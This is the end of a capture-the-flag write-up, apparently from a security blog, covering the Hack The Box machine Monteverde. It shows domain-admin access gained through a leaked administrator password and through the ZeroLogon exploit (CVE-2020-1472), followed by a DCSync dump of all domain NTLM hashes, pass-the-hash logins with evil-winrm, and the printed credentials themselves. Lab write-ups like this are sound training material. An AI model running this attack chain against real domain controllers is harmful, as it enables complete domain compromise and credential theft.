+SMB         10.129.35.54    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.35.54    445    MONTEVERDE       [+] MEGABANK.LOCAL\Administrator:d0m@in4dminyeah! (Pwn3d!)
+SMB         10.129.35.54    445    MONTEVERDE       [+] Executed command via wmiexec
+SMB         10.129.35.54    445    MONTEVERDE       megabank\administrator</code></pre><p>I am now Domain Admin</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i monteverde.megabank.local -u administrator -p &#39;d0m@in4dminyeah!&#39;  
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; cd ../Desktop
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; type root.txt
+b905cdb******************
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; whoami /priv
+
+PRIVILEGES INFORMATION
+----------------------
+
+Privilege Name                            Description                                                        State
+========================================= ================================================================== =======
+SeIncreaseQuotaPrivilege                  Adjust memory quotas for a process                                 Enabled
+SeMachineAccountPrivilege                 Add workstations to domain                                         Enabled
+SeSecurityPrivilege                       Manage auditing and security log                                   Enabled
+SeTakeOwnershipPrivilege                  Take ownership of files or other objects                           Enabled
+SeLoadDriverPrivilege                     Load and unload device drivers                                     Enabled
+SeSystemProfilePrivilege                  Profile system performance                                         Enabled
+SeSystemtimePrivilege                     Change the system time                                             Enabled
+SeProfileSingleProcessPrivilege           Profile single process                                             Enabled
+SeIncreaseBasePriorityPrivilege           Increase scheduling priority                                       Enabled
+SeCreatePagefilePrivilege                 Create a pagefile                                                  Enabled
+SeBackupPrivilege                         Back up files and directories                                      Enabled
+SeRestorePrivilege                        Restore files and directories                                      Enabled
+SeShutdownPrivilege                       Shut down the system                                               Enabled
+SeDebugPrivilege                          Debug programs                                                     Enabled
+SeSystemEnvironmentPrivilege              Modify firmware environment values                                 Enabled
+SeChangeNotifyPrivilege                   Bypass traverse checking                                           Enabled
+SeRemoteShutdownPrivilege                 Force shutdown from a remote system                                Enabled
+SeUndockPrivilege                         Remove computer from docking station                               Enabled
+SeEnableDelegationPrivilege               Enable computer and user accounts to be trusted for delegation     Enabled
+SeManageVolumePrivilege                   Perform volume maintenance tasks                                   Enabled
+SeImpersonatePrivilege                    Impersonate a client after authentication                          Enabled
+SeCreateGlobalPrivilege                   Create global objects                                              Enabled
+SeIncreaseWorkingSetPrivilege             Increase a process working set                                     Enabled
+SeTimeZonePrivilege                       Change the time zone                                               Enabled
+SeCreateSymbolicLinkPrivilege             Create symbolic links                                              Enabled
+SeDelegateSessionUserImpersonatePrivilege Obtain an impersonation token for another user in the same session Enabled
+*Evil-WinRM* PS C:\Users\Administrator\Desktop&gt; </code></pre><p>Domain Admin!</p><p>However, from the start i noticed an out of date windows version so this is likely vulnerable to zerologon since its server 2019</p><h2>Domain Admin via ZeroLogon (Unintended)</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nxc smb monteverde.megabank.local -u SABatchJobs -p &#39;SABatchJobs&#39; -M zerologon
+SMB         10.129.35.54    445    MONTEVERDE       [*] Windows 10 / Server 2019 Build 17763 x64 (name:MONTEVERDE) (domain:MEGABANK.LOCAL) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.129.35.54    445    MONTEVERDE       [+] MEGABANK.LOCAL\SABatchJobs:SABatchJobs 
+ZEROLOGON   10.129.35.54    445    MONTEVERDE       VULNERABLE
+ZEROLOGON   10.129.35.54    445    MONTEVERDE       Next step: https://github.com/dirkjanm/CVE-2020-1472</code></pre><p>I was right!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 cve-2020-1472-exploit.py MONTEVERDE 10.129.35.54
+Performing authentication attempts...
+=======================================================================================================================================
+Target vulnerable, changing account password to empty string
+
+Result: 0
+
+Exploit complete!</code></pre><p>Ill go to the github repo and clone the repo, and then run the exploit!</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">impacket-secretsdump monteverde\$@monteverde.megabank.local -no-pass
+Impacket v0.14.0.dev0 - Copyright Fortra, LLC and its affiliated companies 
+
+[-] RemoteOperations failed: DCERPC Runtime Error: code: 0x5 - rpc_s_access_denied 
+[*] Dumping Domain Credentials (domain\uid:rid:lmhash:nthash)
+[*] Using the DRSUAPI method to get NTDS.DIT secrets
+Administrator:500:aad3b435b51404eeaad3b435b51404ee:100a42db8caea588a626d3a9378cd7ea:::
+Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+krbtgt:502:aad3b435b51404eeaad3b435b51404ee:3480c0ed5001f14fa7a49fdf016043ff:::
+AAD_987d7f2f57d2:1104:aad3b435b51404eeaad3b435b51404ee:599716220acac74a2d9049230d3a8b06:::
+MEGABANK.LOCAL\mhope:1601:aad3b435b51404eeaad3b435b51404ee:f875f9a71efc6b0ee93dd906aedbc8b6:::
+MEGABANK.LOCAL\SABatchJobs:2602:aad3b435b51404eeaad3b435b51404ee:fd980edb4732d8175a52a9b5e1520bc1:::
+MEGABANK.LOCAL\svc-ata:2603:aad3b435b51404eeaad3b435b51404ee:d192ea098c69b7d26c50808a5ac75bea:::
+MEGABANK.LOCAL\svc-bexec:2604:aad3b435b51404eeaad3b435b51404ee:2e4de9439cfd99f861dec8fc460c47e3:::
+MEGABANK.LOCAL\svc-netapp:2605:aad3b435b51404eeaad3b435b51404ee:6bd17d9707c3da465b96cdf0e1a3a4d6:::
+MEGABANK.LOCAL\dgalanos:2613:aad3b435b51404eeaad3b435b51404ee:7a695f4cc64a302d8e53da58f0885736:::
+MEGABANK.LOCAL\roleary:2614:aad3b435b51404eeaad3b435b51404ee:cb3fa0132c099c5b29c30ef128e90ad8:::
+MEGABANK.LOCAL\smorgan:2615:aad3b435b51404eeaad3b435b51404ee:3a2b291c4291a1063a4b32e1770e5388:::
+MONTEVERDE$:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+
+
+...[SNIP]...</code></pre><p>I now have dumped all the hashes from the domain via a DCSync</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">evil-winrm -i monteverde.megabank.local -u administrator -H &#39;100a42db8caea588a626d3a9378cd7ea&#39;
+                                        
+Evil-WinRM shell v3.9
+                                        
+Warning: Remote path completions is disabled due to ruby limitation: undefined method `quoting_detection_proc&#39; for module Reline
+                                        
+Data: For more information, check Evil-WinRM GitHub: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
+                                        
+Info: Establishing connection to remote endpoint
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt; whoami
+megabank\administrator
+*Evil-WinRM* PS C:\Users\Administrator\Documents&gt;</code></pre><p>And once again i am able to get access as the Administrator!</p></div><footer class="writeup-article-footer"><nav class="writeup-viewer-pagination writeup-page-pager" aria-label="More writeups"><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-search/" rel="prev"><span class="writeup-nav-direction">Previous</span><span class="writeup-nav-title">Search</span></a><a class="action secondary writeup-nav-button" href="/writeups/htb/ethan-bauer/htb-office/" rel="next"><span class="writeup-nav-direction">Next</span><span class="writeup-nav-title">Office</span></a></nav><a href="/writeups/">← All writeups</a></footer></article></main><footer class="site-footer site-footer-unified"><div class="footer-brand"><strong>Paracausal Telemetry</strong><blockquote class="footer-quote"><p>&ldquo;Curiouser and curiouser.&rdquo;</p><span class="footer-quote-cite">Lewis Carroll</span></blockquote></div><div class="footer-nav-groups"><div class="footer-nav-group"><span>Explore</span><nav class="footer-links" aria-label="Primary footer navigation"><a href="/writeups/">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/field-guides/">Field guides</a><a href="/#talks">Talks</a><a href="/#observer">Observer</a><a href="/#threat-actors">Threat Actors</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav></div></div><p class="footer-note"><span>paracausaltelemetry.com</span><span>2026</span></p></footer></div><script type="module" src="/js/writeup-page.js?v=search2"></script></body></html>
